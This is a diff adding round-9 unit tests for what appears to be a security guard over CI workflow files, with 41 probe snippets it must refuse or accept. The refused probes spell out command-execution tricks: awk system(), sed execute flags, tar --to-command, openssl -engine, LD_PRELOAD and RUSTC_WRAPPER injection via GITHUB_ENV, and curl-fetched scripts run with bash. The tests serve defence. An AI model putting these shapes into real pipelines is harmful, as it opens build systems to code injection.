@@ -1223,6 +1223,97 @@ class Round8(unittest.TestCase):
             self.assertIn(needle, " | ".join(errs), name)
 
 
+# --- round 9 (PR 8003, code r8 F1-F10, security r8 F1-F7): the reviewers' probe shapes as a table -------------
+P9_HEX = "0123456789abcdef" * 4
+P9_ENV = 'echo "%s" >> "$GITHUB_ENV"'
+
+# name -> (document, files, wanted rc at head): 1 = refused, 0 = accepted
+PROBES9 = {
+    "R-awk print to a pipe held in a variable": (probe_run1("awk 'BEGIN { c = \"id\"; print 1 | c }'"), None, 1),
+    "R-awk system()": (probe_run1("awk 'BEGIN { system(\"id\") }'"), None, 1),
+    "R-awk getline from a command": (probe_run1("awk 'BEGIN { \"id\" | getline x }'"), None, 1),
+    "R-awk program file": (probe_run1("awk -f ci/p.awk x"), None, 1),
+    "R-awk plain field print passes": (probe_run1("awk '{print $1}' x"), None, 0),
+    "R-sed execute command": (probe_run1("sed -n '1e id' x"), None, 1),
+    "R-sed execute flag": (probe_run1("sed 's/.*/id/e' x"), None, 1),
+    "R-sed execute flag with M": (probe_run1("sed 's/.*/id/eM' x"), None, 1),
+    "R-sed program file": (probe_run1("sed -f ci/p.sed x"), None, 1),
+    "R-sed plain substitution passes": (probe_run1("sed 's/a/b/' x"), None, 0),
+    "R-tar --to-command": (probe_run1("tar -xf a.tar --to-command=id"), None, 1),
+    "R-tar --checkpoint-action=exec": (probe_run1("tar -xf a.tar --checkpoint=1 --checkpoint-action=exec=id"), None, 1),
+    "R-tar -I": (probe_run1("tar -I id -xf a.tar"), None, 1),
+    "R-tar plain extract passes": (probe_run1("tar -xzf ci/a.tgz"), None, 0),
+    "P01 gh api raw content then bash": (probe_runs("      - run: gh api -H 'Accept: application/vnd.github.raw' repos/o/r/contents/i.sh > i.sh\n",
+                                                    "      - run: bash i.sh\n"), None, 1),
+    "P51 gh api output then source": (probe_run1("gh api repos/o/r/contents/e.sh > e.sh", "source e.sh"), None, 1),
+    "B-git show of another ref then bash": (probe_run1("git show origin/x:i.sh > i.sh", "bash i.sh"), None, 1),
+    "R-print-only sha256sum then bash": (probe_runs("      - run: curl -fsSL -o i.sh https://x.example/i.sh\n",
+                                                    "      - run: |\n          sha256sum i.sh\n          bash i.sh\n"), None, 1),
+    "R-self-made digest through a variable": (probe_run1(PROBE_FETCH, "h=$(sha256sum f)", 'echo "${h%% *}  f" | sha256sum -c -', "tar xzf f"), None, 1),
+    "K01 pinned literal digest then tar": (probe_run1(PROBE_FETCH, 'echo "%s  f" | sha256sum -c -' % P9_HEX, "tar xzf f"), None, 0),
+    "K03 gh attestation verify then tar": (probe_runs("      - run: " + PROBE_FETCH + "\n",
+                                                      "      - run: |\n          gh attestation verify f -R o/r\n          tar xzf f\n"), None, 0),
+    "K04 cargo install of a pinned version": (probe_run1("cargo install cargo-cyclonedx --locked --version 0.5.7"), None, 0),
+    "R-openssl -engine": (probe_run1("openssl dgst -engine ./e.so -sha256 f"), None, 1),
+    "R-openssl -provider-path": (probe_run1("openssl dgst -provider-path ./p -sha256 f"), None, 1),
+    "R-openssl rand passes": (probe_run1("openssl rand -hex 8"), None, 0),
+    "R-quoted script path passes": (probe_run1('bash "ci/x.sh"'), None, 0),
+    "R-mapping matrix value spliced": (probe_runs("      - run: echo ${{ matrix.k }}\n",
+                                                  head="    strategy:\n      matrix:\n        k:\n          a: b\n"), None, 1),
+    "P15 export LD_PRELOAD then cargo": (probe_run1("export LD_PRELOAD=./x.so", "cargo build --locked"), None, 1),
+    "P46 LD_PRELOAD through GITHUB_ENV": (probe_run1(P9_ENV % "LD_PRELOAD=./x.so"), None, 1),
+    "P54 step env RUSTC_WRAPPER": (probe_runs("      - run: cargo build --locked\n        env:\n          RUSTC_WRAPPER: ./x\n"), None, 1),
+    "P55 inline CARGO_BUILD_RUSTC_WRAPPER": (probe_run1("CARGO_BUILD_RUSTC_WRAPPER=./x cargo build --locked"), None, 1),
+    "P56 RUSTC_WRAPPER through GITHUB_ENV then cargo": (probe_runs("      - run: " + (P9_ENV % "RUSTC_WRAPPER=./x") + "\n", "      - run: cargo build --locked\n"), None, 1),
+    "S-RUSTFLAGS linker": (probe_run1('export RUSTFLAGS="-C linker=./x"'), None, 1),
+    "S-RUSTFLAGS target-cpu passes": (probe_run1('RUSTFLAGS="-C target-cpu=native" cargo build --locked'), None, 0),
+    "S-CARGO_REGISTRY_TOKEN env passes": (probe_runs("      - run: cargo build --locked\n        env:\n          CARGO_REGISTRY_TOKEN: ${{ secrets.T }}\n"), None, 0),
+    "S-env -i": (probe_run1("env -i cargo build --locked"), None, 1),
+    "P11 download renamed through an env value": (probe_runs("      - run: curl -fsSL -o run.sh https://x.example/run.sh\n",
+                                                             "      - run: cp \"$F\" x.sh\n        env:\n          F: run.sh\n", "      - run: bash x.sh\n"), None, 1),
+    "P12 download extracted through an env value": (probe_runs("      - run: curl -fsSL -o a.tgz https://x.example/a.tgz\n",
+                                                               "      - run: tar xzf \"$F\"\n        env:\n          F: a.tgz\n"), None, 1),
+    "P13 bare glob over a download directory": (probe_runs("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n",
+                                                           "      - run: chmod +x d/*\n"), None, 1),
+    "P13 download directory on GITHUB_PATH": (probe_runs("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n",
+                                                         "      - run: echo \"$PWD/d\" >> \"$GITHUB_PATH\"\n"), None, 1),
+    "P14 step env RUSTC naming a download": (probe_runs("      - run: curl -fsSL -o r https://x.example/r\n",
+                                                        "      - run: cargo build --locked\n        env:\n          RUSTC: ./r\n"), None, 1),
+}
+
+
+class Round9(unittest.TestCase):
+    """PR 8003 round 9 (code r8 F1-F10, security r8 F1-F7): the reviewers' probe shapes are table rows; a row wants the
+    return code of `r5_errors` (1 = refused, 0 = accepted). The 224 self-test cases of the guard run here too."""
+
+    def test_probe_table_has_the_expected_size(self):
+        self.assertEqual(len(PROBES9), 41)
+
+    def test_every_probe_matches_its_wanted_result(self):
+        tree = Path(scratch()) / "r9probe"
+        wrong = []
+        for name, (doc, files, want) in PROBES9.items():
+            got = 1 if G.r5_errors(doc, files, tree) else 0
+            if got != want:
+                wrong.append("%s: rc %d want %d" % (name, got, want))
+        self.assertEqual(wrong, [])
+
+    def test_the_guard_round9_cases_match(self):
+        tree = Path(scratch()) / "r9cases"
+        wrong = []
+        for name, (doc, files, count, needle) in G.R9_CASES.items():
+            errs = G.r5_errors(doc, files, tree)
+            if len(errs) != count or (needle and needle not in " | ".join(errs)):
+                wrong.append(name)
+        self.assertEqual(wrong, [])
+        self.assertEqual(len(G.R9_CASES), 224)
+
+    def test_every_refused_cargo_config_key_has_an_environment_twin(self):
+        """Security r8 F2: `cargo --config <key>` is refused, so the env variable that sets the same key is refused too."""
+        self.assertEqual(G.cargo_config_twins(), [])
+        self.assertGreaterEqual(len(G.CARGO_CONFIG_ENV_TWINS), 8)
+
+
 class SelfTest8023(unittest.TestCase):
     """#8023: --self-test (run by c8-precheck) carries a cell for each new refusal site."""
 
